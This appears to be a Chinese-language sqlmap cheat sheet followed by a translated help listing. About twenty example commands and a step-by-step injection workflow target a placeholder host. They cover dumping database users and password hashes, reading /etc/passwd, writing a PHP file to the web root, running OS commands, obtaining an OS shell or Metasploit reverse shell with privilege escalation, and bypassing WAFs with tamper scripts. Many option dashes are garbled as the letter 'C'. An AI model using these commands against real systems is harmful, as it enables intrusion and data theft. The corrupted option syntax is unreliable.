cookie注入：sqlmap.py -u 注入点 --cookie "参数" --tables --level 2

POST登录框注入：sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables
                sqlmap.py -u 登录的地址 --forms 自动判断注入
                sqlmap.py -u 登录的地址 --data "指定参数"

绕过waf防火墙：sqlmap.py -u 注入点 -v 3 --dbs  --batch --tamper "space2morehash.py"
               space2hash.py   base64encode.py charencode.py


-u #注入点
-g 谷歌搜索
-f #指纹判别数据库类型
-b #获取数据库版本信息
-p #指定可测试的参数(?page=1&id=2 -p “page,id”)
-D “” #指定数据库名
-T “” #指定表名
-C “” #指定字段
-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” Cresume)
Ccolumns #列出字段
Ccurrent-user #获取当前用户名称
Ccurrent-db #获取当前数据库名称
Cusers #列数据库所有用户
Cpasswords #数据库用户所有密码
Cprivileges #查看用户权限(Cprivileges -U root)
-U #指定数据库用户
Cdbs #列出所有数据库
Ctables -D “” #列出指定数据库中的表
Ccolumns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段
Cdump-all #列出所有数据库所有表
Cexclude-sysdbs #只列出用户自己新建的数据库和表
Cdump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(Cdump -T users -D master -C surname)
Cdump -T “” -D “” Cstart 2 Ctop 4 # 列出指定数据库的表的2-4字段的数据
Cdbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)
Cos #指定系统(Linux,Windows)
--sql -shell  写shell
--delay 延迟的时间
--safe-freq 次数
-v #详细的等级(0-6)
0：只显示Python的回溯，错误和关键消息。
1：显示信息和警告消息。
2：显示调试消息。
3：有效载荷注入。
4：显示HTTP请求。
5：显示HTTP响应头。
6：显示HTTP响应页面的内容
Cprivileges #查看权限
Cis-dba #是否是数据库管理员
Croles #枚举数据库用户角色
Cudf-inject #导入用户自定义函数（获取系统权限）
Cunion-check #是否支持union 注入
Cunion-cols #union 查询表记录
Cunion-test #union 语句测试
Cunion-use #采用union 注入
Cunion-tech orderby #union配合order by
Cmethod “POST” Cdata “” #POST方式提交数据(Cmethod “POST” Cdata “page=1&id=2″)
Ccookie “用;号分开” #cookie注入(Ccookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)
Creferer “” #使用referer欺骗(Creferer “http://www.baidu.com”)
Cuser-agent “” #自定义user-agent
Cproxy “http://127.0.0.1:8118″ #代理注入
Cstring “” #指定关键词
Cthreads 　　 #采用多线程(Cthreads 3)
Csql-shell #执行指定sql命令
Csql-query #执行指定的sql语句(Csql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )
Cfile-read #读取指定文件
Cfile-write #写入本地文件(Cfile-write /test/test.txt Cfile-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)
Cfile-dest #要写入的文件绝对路径
Cos-cmd=id #执行系统命令
Cos-shell #系统交互shell
Cos-pwn #反弹shell(Cos-pwn Cmsf-path=/opt/framework/msf3/)
Cmsf-path= #matesploit绝对路径(Cmsf-path=/opt/framework/msf3/)
Cos-smbrelay #
Cos-bof #
Creg-read #读取win系统注册表
Cpriv-esc #
Ctime-sec= #延迟设置 默认Ctime-sec=5 为5秒
-p “user-agent” Cuser-agent “sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)” #指定user-agent注入
Ceta #盲注
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典
common-outputs.txt
common-tables.txt 表字典
keywords.txt
oracle-default-passwords.txt
user-agents.txt
wordlist.txt
常用语句
1.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -f -b Ccurrent-user Ccurrent-db Cusers Cpasswords Cdbs -v 0
2.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cpasswords -U root Cunion-use -v 2
3.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cdump -T users -C username -D userdb Cstart 2 Cstop 3 -v 2
4.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cdump -C “user,pass” -v 1 Cexclude-sysdbs
5.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Csql-shell -v 2
6.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cfile-read “c:\boot.ini” -v 2
7.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cfile-write /test/test.txt Cfile-dest /var/www/html/1.txt -v 2
8.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cos-cmd “id” -v 1
9.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cos-shell Cunion-use -v 2
10.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cos-pwn Cmsf-path=/opt/framework/msf3 Cpriv-esc -v 1
11.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cos-pwn Cmsf-path=/opt/framework/msf3 -v 1
12.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Cos-bof Cmsf-path=/opt/framework/msf3 -v 1
13.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 Creg-add Creg-key=”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” Creg-value=Test Creg-type=REG_SZ Creg-data=1
14.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b Ceta
15.
./sqlmap.py -u “http://www.evil0x.com/ sqlmap/mysql/get_str_brackets.php?id=1″ -p id Cprefix “‘)” Csuffix “AND (‘abc’='abc”
16.
./sqlmap.py -u “http://www.evil0x.com/ sqlmap/mysql/basic/get_int.php?id=1″ Cauth-type Basic Cauth-cred “testuser:testpass”
17.
./sqlmap.py -l burp.log Cscope=”(www)?\.target\.(com|net|org)”
18.
./sqlmap.py -u “http://www.evil0x.com/ sqlmap/mysql/get_int.php?id=1″ Ctamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
19.
./sqlmap.py -u “http://www.evil0x.com/ sqlmap/mssql/get_int.php?id=1″ Csql-query “SELECT ‘foo’” -v 1
20.
./sqlmap.py -u “http://www.evil0x.com/ mysql/get_int_4.php?id=1″ Ccommon-tables -D testdb Cbanner

简单的注入流程
1.读取数据库版本，当前用户，当前数据库
sqlmap -u http://www.evil0x.com/ test.php?p=2 -f -b Ccurrent-user Ccurrent-db -v 1
2.判断当前数据库用户权限
sqlmap -u http://www.evil0x.com/ test.php?p=2 Cprivileges -U 用户名 -v 1
sqlmap -u http://www.evil0x.com/ test.php?p=2 Cis-dba -U 用户名 -v 1
3.读取所有数据库用户或指定数据库用户的密码
sqlmap -u http://www.evil0x.com/ test.php?p=2 Cusers Cpasswords -v 2
sqlmap -u http://www.evil0x.com/ test.php?p=2 Cpasswords -U root -v 2
4.获取所有数据库
sqlmap -u http://www.evil0x.com/ test.php?p=2 Cdbs -v 2
5.获取指定数据库中的所有表
sqlmap -u http://www.evil0x.com/ test.php?p=2 Ctables -D mysql -v 2
6.获取指定数据库名中指定表的字段
sqlmap -u http://www.evil0x.com/ test.php?p=2 Ccolumns -D mysql -T users -v 2
7.获取指定数据库名中指定表中指定字段的数据
sqlmap -u http://www.evil0x.com/ test.php?p=2 Cdump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2
8.file-read读取web文件
sqlmap -u http://www.evil0x.com/ test.php?p=2 Cfile-read “/etc/passwd” -v 2
9.file-write写入文件到web
sqlmap -u http://www.evil0x.com/ test.php?p=2 Cfile-write /localhost/mm.php Cfile-dest

















python sqlmap/sqlmap.py -help


Options（选项）： 

--version 显示程序的版本号并退出 

-h, --help 显示此帮助消息并退出 

-v VERBOSE 详细级别：0-6（默认为1） 

   

Target（目标）： 

以下至少需要设置其中一个选项，设置目标URL。 

   

-d DIRECT 直接连接到数据库。 

-u URL, --url=URL 目标URL。 

-l LIST 从Burp或WebScarab代理的日志中解析目标。 

-r REQUESTFILE 从一个文件中载入HTTP请求。 

-g GOOGLEDORK 处理Google dork的结果作为目标URL。 

-c CONFIGFILE 从INI配置文件中加载选项。 

   

Request（请求）： 

这些选项可以用来指定如何连接到目标URL。 

   

--data=DATA 通过POST发送的数据字符串 

--cookie=COOKIE HTTP Cookie头 

--cookie-urlencode URL 编码生成的cookie注入 

--drop-set-cookie 忽略响应的Set - Cookie头信息 

--user-agent=AGENT 指定 HTTP User - Agent头 

--random-agent 使用随机选定的HTTP User - Agent头 

--referer=REFERER 指定 HTTP Referer头 

--headers=HEADERS 换行分开，加入其他的HTTP头 

--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM) 

--auth-cred=ACRED HTTP身份验证凭据（用户名:密码） 

--auth-cert=ACERT HTTP认证证书（key_file，cert_file） 

--proxy=PROXY 使用HTTP代理连接到目标URL 

--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码） 

--ignore-proxy 忽略系统默认的HTTP代理 

--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒 

--timeout=TIMEOUT 等待连接超时的时间（默认为30秒） 

--retries=RETRIES 连接超时后重新连接的时间（默认3） 

--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式 

--safe-url=SAFURL 在测试过程中经常访问的url地址 

--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL 

   

Optimization（优化）： 

这些选项可用于优化SqlMap的性能。 

   

-o 开启所有优化开关 

--predict-output 预测常见的查询输出 

--keep-alive 使用持久的HTTP（S）连接 

--null-connection 从没有实际的HTTP响应体中检索页面长度 

--threads=THREADS 最大的HTTP（S）请求并发量（默认为1） 

   

Injection（注入）： 

这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 

   

-p TESTPARAMETER 可测试的参数（S） 

--dbms=DBMS 强制后端的DBMS为此值 

--os=OS 强制后端的DBMS操作系统为这个值 

--prefix=PREFIX 注入payload字符串前缀 

--suffix=SUFFIX 注入payload字符串后缀 

--tamper=TAMPER 使用给定的脚本（S）篡改注入数据 

   

Detection（检测）： 

这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 

   

--level=LEVEL 执行测试的等级（1-5，默认为1） 

--risk=RISK 执行测试的风险（0-3，默认为1） 

--string=STRING 查询时有效时在页面匹配字符串 

--regexp=REGEXP 查询时有效时在页面匹配正则表达式 

--text-only 仅基于在文本内容比较网页 

   

Techniques（技巧）： 

这些选项可用于调整具体的SQL注入测试。 

   

--technique=TECH SQL注入技术测试（默认BEUST） 

--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） 

--union-cols=UCOLS 定列范围用于测试UNION查询注入 

--union-char=UCHAR 用于暴力猜解列数的字符 

   

Fingerprint（指纹）： 

-f, --fingerprint 执行检查广泛的DBMS版本指纹 

   

Enumeration（枚举）： 

这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己 

的SQL语句。 

-b, --banner 检索数据库管理系统的标识 

--current-user 检索数据库管理系统当前用户 

--current-db 检索数据库管理系统当前数据库 

--is-dba 检测DBMS当前用户是否DBA 

--users 枚举数据库管理系统用户 

--passwords 枚举数据库管理系统用户密码哈希 

--privileges 枚举数据库管理系统用户的权限 

--roles 枚举数据库管理系统用户的角色 

--dbs 枚举数据库管理系统数据库 

--tables 枚举的DBMS数据库中的表 

--columns 枚举DBMS数据库表列 

--dump 转储数据库管理系统的数据库中的表项 

--dump-all 转储所有的DBMS数据库表中的条目 

--search 搜索列（S），表（S）和/或数据库名称（S） 

-D DB 要进行枚举的数据库名 

-T TBL 要进行枚举的数据库表 

-C COL 要进行枚举的数据库列 

-U USER 用来进行枚举的数据库用户 

--exclude-sysdbs 枚举表时排除系统数据库 

--start=LIMITSTART 第一个查询输出进入检索 

--stop=LIMITSTOP 最后查询的输出进入检索 

--first=FIRSTCHAR 第一个查询输出字的字符检索 

--last=LASTCHAR 最后查询的输出字字符检索 

--sql-query=QUERY 要执行的SQL语句 

--sql-shell 提示交互式SQL的shell 

   

Brute force（蛮力）： 

这些选项可以被用来运行蛮力检查。 

   

--common-tables 检查存在共同表 

--common-columns 检查存在共同列 

   

User-defined function injection（用户自定义函数注入）： 

这些选项可以用来创建用户自定义函数。 

   

--udf-inject 注入用户自定义函数 

--shared-lib=SHLIB 共享库的本地路径 

   

File system access（访问文件系统）： 

这些选项可以被用来访问后端数据库管理系统的底层文件系统。 

   

--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 

--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 

--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 

   

Operating system access（操作系统访问）： 

这些选项可以用于访问后端数据库管理系统的底层操作系统。 

   

--os-cmd=OSCMD 执行操作系统命令 

--os-shell 交互式的操作系统的shell 

--os-pwn 获取一个OOB shell，meterpreter或VNC 

--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC 

--os-bof 存储过程缓冲区溢出利用 

--priv-esc 数据库进程用户权限提升 

--msf-path=MSFPATH Metasploit Framework本地的安装路径 

--tmp-path=TMPPATH 远程临时文件目录的绝对路径 

   

Windows注册表访问： 

这些选项可以被用来访问后端数据库管理系统Windows注册表。 

   

--reg-read 读一个Windows注册表项值 

--reg-add 写一个Windows注册表项值数据 

--reg-del 删除Windows注册表键值 

--reg-key=REGKEY Windows注册表键 

--reg-value=REGVAL Windows注册表项值 

--reg-data=REGDATA Windows注册表键值数据 

--reg-type=REGTYPE Windows注册表项值类型 

   

General（一般）： 

   

这些选项可以用来设置一些一般的工作参数。 

-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中 

-s SESSIONFILE 保存和恢复检索会话文件的所有数据 

--flush-session 刷新当前目标的会话文件 

--fresh-queries 忽略在会话文件中存储的查询结果 

--eta 显示每个输出的预计到达时间 

--update 更新SqlMap 

--save file保存选项到INI配置文件 

--batch 从不询问用户输入，使用所有默认配置。 

   

Miscellaneous（杂项）： 

--beep 发现SQL注入时提醒 

--check-payload IDS对注入payloads的检测测试 

--cleanup SqlMap具体的UDF和表清理DBMS 

--forms 对目标URL的解析和测试形式 

--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果 

--page-rank Google dork结果显示网页排名（PR） 

--parse-errors 从响应页面解析数据库管理系统的错误消息 

--replicate 复制转储的数据到一个sqlite3数据库 

--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址 

--wizard 给初级用户的简单向导界面 